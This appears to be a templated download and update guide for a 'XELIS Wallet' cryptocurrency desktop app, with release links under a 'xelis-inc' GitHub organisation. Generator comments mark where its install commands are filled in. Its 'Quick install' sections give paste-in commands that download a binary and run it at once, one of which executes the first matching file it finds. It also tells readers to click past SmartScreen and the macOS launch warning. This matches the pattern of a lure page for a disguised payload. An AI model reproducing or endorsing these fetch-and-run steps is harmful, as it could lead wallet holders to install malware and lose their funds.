![Update XELIS Wallet without losing your wallet](assets/banner-article.png)
# Update XELIS Wallet without losing your wallet

Back up, install over the old version, confirm it still opens.

## Downloads - Update

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

The update is the installer on the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1), installed the same way as the first time. There is no separate updater to hunt for.

> An update replaces the application, not the wallet. The database stays where it is until you decide otherwise.

To update XELIS Wallet, back up the 25-word phrase, close the app, install the current release over the existing one, then reopen and confirm the same address and balance. The wallet's local database is left in place, so nothing is recreated. The only step that is not optional is the backup: it is what makes an interrupted update recoverable.

<!-- ARTICLE-BODY-BEGIN -->
## What an update touches and what it leaves alone

The installer writes application files. Your wallet lives in a local encrypted database outside those files, so the update does not regenerate keys, does not change your address, and does not ask for the phrase again. Your local password is unchanged, and an update is a new version of the program rather than a new wallet.

## Take the backup first

Record the phrase before you install anything, in the form described under <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md">back up before updating XELIS Wallet</a>. The probability of needing it is low, and the cost of not having it is the whole wallet, which is an easy trade to make once.

If the phrase was never recorded properly, do that now rather than after the update. An update that goes wrong with no backup turns a ten-minute job into a permanent loss.

## Update step by step

1. Write down the 25-word phrase and confirm it against the wallet.
2. Close XELIS Wallet completely, including any background or tray instance if your build has one.
3. Download the installer for your platform from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>.
4. Confirm the file matches your platform and architecture before you run it.
5. Run the installer over the existing installation. On Linux, replace the extracted folder rather than mixing two builds.
6. Open the app, unlock it, and check the address and balance.
7. Only then delete the old installer or archive.

Step 3 is also the moment to re-check the build: <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md">XELIS Wallet system requirements</a> lists the operating systems and architectures the current release still supports, and an update on an unsupported machine fails the way a first install does.

Step 5 is where platform differences matter. Windows and macOS update in place; a Linux archive is replaced, which means the old folder should be removed once the new one runs correctly, not before.

## If the update does not start or the app will not open

| Symptom | Likely cause | What to do |
| --- | --- | --- |
| Installer refuses to run | Wrong build for the OS or architecture | Download the matching asset |
| App opens to an empty window | Partial install or a leftover process | Restart, then reinstall if it repeats |
| Wallet asks to create a new wallet | The old database is not being found | Stop; do not create anything, and restore from the phrase |
| Password no longer unlocks | A different installation is being opened | Check you launched the new build, not an old copy |

The third row is the one to treat as an emergency. Creating a new wallet over an unreachable database is recoverable only through the phrase, so restore instead, using <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-uninstall-clean-reinstall.md">uninstall and reinstall XELIS Wallet</a> for the clean path.

## FAQ

### Does updating XELIS Wallet delete my wallet?

No. The local database stays in place and opens with the same password. A backup still comes first, because an interrupted install is not a wallet operation.

### Which XELIS Wallet version is current?

Whichever version the release page lists today. Use the page rather than a version number you read somewhere else, since numbers go stale.

### Where do I find the latest release to download?

The release page linked in every download table on this site. Any other source is not the official one.

### Do I need to uninstall before updating?

No. Install over the existing version on Windows and macOS; replace the folder on Linux. Uninstalling first only adds a step that can lose local data.

### Will my balance and history still be there?

Yes, once the wallet syncs. The data is local and the chain is unchanged; a slow first sync after an update is normal.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Uninstall and reinstall XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-uninstall-clean-reinstall.md)
- [Back up before updating XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md)
- [XELIS Wallet system requirements](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-system-requirements-unsupported-platforms.md)
- [Check the official XELIS Wallet download](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-official-download-check.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
